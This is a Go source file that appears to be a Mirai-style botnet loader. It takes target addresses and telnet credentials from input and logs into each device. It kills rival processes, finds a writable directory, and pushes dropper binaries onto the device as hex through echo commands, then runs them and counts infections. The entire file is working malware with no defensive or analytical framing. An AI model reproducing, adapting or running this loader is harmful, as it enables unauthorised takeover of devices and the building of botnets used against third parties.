package main

import (
	"bufio"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var (
	dirs = []string{
		"/tmp/",
		"/var/",
		"/var/tmp/",
		"/var/run/",
		"/dev/",
		"/dev/shm/",
		"/etc/",
		"/mnt/",
		"/usr/",
		"/boot/",
		"/home/",
		"/root/",
	}

	arches = readArches("dlrs") // dir of dlrs

	shellPrompt = []string{"#", "$"}

	syncWait                                  sync.WaitGroup
	statusFound, statusLogins, statusInfected int
)

func readArch(dlr string) []string {
	f, err := os.Open(dlr)

	if err != nil {
		fmt.Printf("Failed to open %s!\n", dlr)
		os.Exit(1)
	}

	tmp_hex := ""
	buf := make([]byte, 128)
	hex_arr := make([]byte, 1)

	var dlr_hex []string

	for {
		_, err := f.Read(buf)

		if err == io.EOF {
			break
		}

		for _, ch := range buf {
			hex_arr[0] = ch
			hx := hex.EncodeToString(hex_arr)
			tmp_hex += "\\x" + hx
		}

		dlr_hex = append(dlr_hex, tmp_hex)
		tmp_hex = ""
	}

	//fmt.Printf("Loaded -> %s\n", dlr_hex)
	return dlr_hex
}

func readArches(dir string) map[string][]string {
	files, err := os.ReadDir(dir)
	if err != nil {
		log.Fatalf("Failed to read directory: %v", err)
		os.Exit(1)
	}

	archData := make(map[string][]string)

	for _, file := range files {
		if !file.IsDir() {
			filePath := filepath.Join(dir, file.Name())
			archData[file.Name()] = readArch(filePath)
		}
	}

	return archData
}

func recvPrompt(conn net.Conn, elements []string) bool {
	conn.SetReadDeadline(time.Now().Add(25 * time.Second))
	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
	for {
		buff := make([]byte, 1024)
		len, err := conn.Read(buff)

		if len <= 0 {
			return false
		}

		if err != nil {
			return false
		}

		if strings.Contains(string(buff), "ncorrect") {
			return false
		}

		for _, element := range elements {
			if strings.Contains(string(buff), element) {
				return true
			}
		}
	}
	return false
}

func cleanDevice(target string, conn net.Conn) bool {

	conn.Write([]byte("for dir in /proc/[0-9]*; do\r\n"))
	if !recvPrompt(conn, []string{">"}) {
		return false
	}

	conn.Write([]byte("    pid=${dir##*/}\r\n"))
	if !recvPrompt(conn, []string{">"}) {
		return false
	}

	conn.Write([]byte("    kill -9 $pid\r\n"))
	if !recvPrompt(conn, []string{">"}) {
		return false
	}

	conn.Write([]byte("    sh -c kill -9 $pid\r\n"))
	if !recvPrompt(conn, []string{">"}) {
		return false
	}

	conn.Write([]byte("done\r\n"))
	if !recvPrompt(conn, shellPrompt) {
		return false
	}

	return true
}

func echoDevice(target string, conn net.Conn) bool {
	// prep the device

	conn.Write([]byte("rm -rf 1; rm -rf 1\r\n"))

	if !recvPrompt(conn, shellPrompt) {
		return false
	}

	// device prepped

	// fmt.Printf("Device Prepped, starting echo..\n")

	for arch, data := range arches {
		var cat = ">"
		for i, x := range data {
			if i > 0 {
				cat = ">>"
			}
			conn.Write([]byte(fmt.Sprintf("echo -ne \"%s\" %s 1\r\n", x, cat)))
			if !recvPrompt(conn, shellPrompt) {
				// fmt.Printf("[%s] Failed to echo dlr: %s\n", arch, target)
				break
			}
		}

		conn.Write([]byte("chmod 777 1; ./1; rm -rf 1\r\n"))
		if !recvPrompt(conn, []string{"MIRAI"}) {
			// fmt.Printf("[%s] Failed to execute dlr: %s\n", arch, target)
			continue
		}

		conn.Write([]byte("chmod 777 2; ./2 selfrep.echo; rm -rf 2\r\n"))
		if !recvPrompt(conn, []string{".data"}) {
			//			fmt.Printf("[%s] Failed to execute binary: %s\n", arch, target)
			continue
		}

		fmt.Printf("[BOTNET] infected (%s): %s\n", arch, target)
		statusInfected++
		return true
	}
	return false
}

func infectDevice(text string) bool { // target, username, password string) bool {
	var parts = strings.SplitN(text, " ", 2)
	if len(parts) != 2 {
		return false
	}

	var target, creds = parts[0], parts[1]
	var cparts = strings.SplitN(creds, ":", 2)
	if len(cparts) != 2 {
		return false
	}

	statusFound++

	conn, err := net.Dial("tcp", target)

	if err != nil {
		return false
	}

	defer conn.Close()

	if !recvPrompt(conn, []string{"ogin:"}) {
		return false
	}

	conn.Write([]byte(cparts[0] + "\r\n"))

	if !recvPrompt(conn, []string{"assword:"}) {
		return false
	}

	conn.Write([]byte(cparts[1] + "\r\n"))

	if !recvPrompt(conn, shellPrompt) {
		return false
	}

	conn.Write([]byte("cd /proc/; cat self/cmdline\r\n"))

	if !recvPrompt(conn, []string{"cat\000self/cmdline"}) {
		return false
	}

	fmt.Printf("[BOTNET] logged in: %s %s:%s\n", target, cparts[0], cparts[1])
	statusLogins++

	conn.Write([]byte("for pid in /proc/[0-9]*; do case $(ls -l $pid/exe) in *'(deleted)'*|*'/.'*) kill -9 ${pid##*/} ;; esac; done\r\n"))

	if !recvPrompt(conn, shellPrompt) {
		return false
	}

	for _, dir := range dirs {
		conn.Write([]byte(fmt.Sprintf("> %s0 && chmod 777 %s0 && %s0 && cd %s; rm 0\r\n", dir, dir, dir, dir)))
		if !recvPrompt(conn, shellPrompt) {
			return false
		}
	}

	if !echoDevice(target, conn) {
		return false
	}
	//	file, err := os.OpenFile("logins.txt", os.O_RDWR|os.O_APPEND|os.O_CREATE, 0666)
	//	if err != nil {
	//		log.Fatal("Cannot create file", err)
	//	}
	//	defer file.Close()
	//	fmt.Fprintf(file, "%s/16\n", target)
	//
	//	conn.Write([]byte("cd;umount ff; rm -rf ff\r\n"))
	//
	//	if !recvPrompt(conn, shellPrompt) {
	//		return false
	//	}
	//
	//	if !echoDevice(target, conn) {
	//		if strings.Contains(username, "guest") {
	//			for i := 0; i < 3; i++ {
	//				cleanDevice(target, conn)
	//				// conn.Write([]byte("for dir in /proc/[0-9]*; do pid=${dir##*/}; kill -9 $pid; sh -c \"kill -9 $pid\"; done\r\n"))
	//			}
	//		}
	//		fmt.Printf("[CHINA] failed to infect: %s\n", target)
	//		return false
	//	}

	return true
}

func main() {
	scanner := bufio.NewScanner(os.Stdin)

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Found: %d, Logins: %d, Infected: %d\r\n", i, statusFound, statusLogins, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	}()

	for scanner.Scan() {
		syncWait.Add(1)
		go infectDevice(scanner.Text())
	}

	syncWait.Wait()
}
